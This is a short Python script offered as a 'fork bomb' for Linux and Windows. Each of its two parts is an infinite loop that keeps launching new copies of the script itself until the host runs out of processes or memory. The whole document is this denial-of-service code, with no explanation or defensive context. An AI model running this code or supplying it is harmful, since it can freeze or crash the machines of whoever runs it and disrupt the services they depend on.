import subprocess, sys


# LINUX FORK BOMB 
while True:
    subprocess.Popen([sys.executable, sys.argv[0]], shell=True)

  
# WINDOWS FORK BOMB
while True:
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
